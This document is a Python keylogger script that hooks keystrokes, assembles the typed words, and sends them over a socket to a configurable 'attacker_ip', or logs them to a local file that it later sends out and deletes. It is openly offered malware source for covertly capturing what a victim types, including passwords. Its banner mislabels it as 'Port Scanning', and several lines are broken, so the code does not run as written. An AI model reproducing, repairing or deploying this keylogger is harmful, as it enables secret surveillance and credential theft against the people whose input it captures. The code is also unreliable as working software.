import os
import sys
import keyboard
import socket
import colorama
from colorama import Fore, Style
from pyfiglet import Figlet

client_socket
captured_word = ""
attacker_ip = "127.0.0.1"  # modify
attacker_port = "80"  # modify
established_connection = False
file = "captured_words.txt"

fig = Figlet(font='small')

colorama.init()


def establish_connection():

    global client_socket
    global established_connection
    global attacker_ip
    global attacker_port
    global file

    try:

        # Create socket connection
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Try to establish connection
        client_socket.connect((attacker_ip, attacker_port))

        print("\n" + Fore.RED +
              "Established connections --> The words will be sent to the machine" + Fore.RESET)

        established_connection = True

    # Captured exception
    except socket.error as e:

        print("\n" + Fore.RED + "Unable to establish connection to machine with " +
              Fore.LIGHTBLUE_EX + attacker_ip + " on port " + Fore.LIGHTBLUE_EX + attacker_port +
              " --> Words will be stored in file " + Fore.LIGHTBLUE_EX + file + Fore.RESET)

        established_connection = False


def clear_terminal():

    if os.name == 'posix':  # Linux
        os.system('clear')

    elif os.name == 'nt':  # Windows
        os.system('cls')

    else:
        print("The operating system could not be determined")


def logger(key):

    global captured_word
    global established_connection

    if key == keyboard.KEY_DOWN:

        if key.name == 'space':

            if established_connection == True:
                send_word_by_socket()
            else:
                store_word_on_file()

        # If the space key is not pressed, it means that
        # the word has not yet been completely written,
        # so the pressed letter is concatenated
        elif len(key.name) == 1 and key.name.isprintable():
            captured_word += key.name


def send_word_by_socket():

    global client_socket
    global captured_word

    client_socket.send()

    reset_word()


def send_file_content():

    global client_socket
    global file

    try:
        with open(file, 'rb') as file:

            content = file.read()

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

            client_socket.sendall(content)
            os.remove(file)

    except Exception as e:
        print(f"Error send file content => {e}")


def store_word_on_file():

    global file
    global captured_word

    with open(file, "a") as file:
        file.write(captured_word + "\n")

    print("\n" + Fore.GREEN +
          "Captured word --> " + captured_word + Fore.RESET)

    reset_word()


def reset_word():

    global captured_word
    captured_word = ""


def main():

    global established_connection

    clear_terminal()

    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + fig.renderText("Port Scanning") +
          "\n--------------- Code By @IvaanFd ---------------" + Fore.RESET)

    establish_connection()

    keyboard.hook(logger)

    # Loop that must be running to stop the script with escape key
    try:

        keyboard.wait('esc')
        keyboard.unhook_all()

        if established_connection == True:

            global client_socket
            client_socket.close()

        sys.exit()

    except KeyboardInterrupt:

        print("\n" + Fore.GREEN + "Keylogger execution stopped " + Fore.RESET)

        if established_connection == True:

            global client_socket
            client_socket.close()

        pass


main()
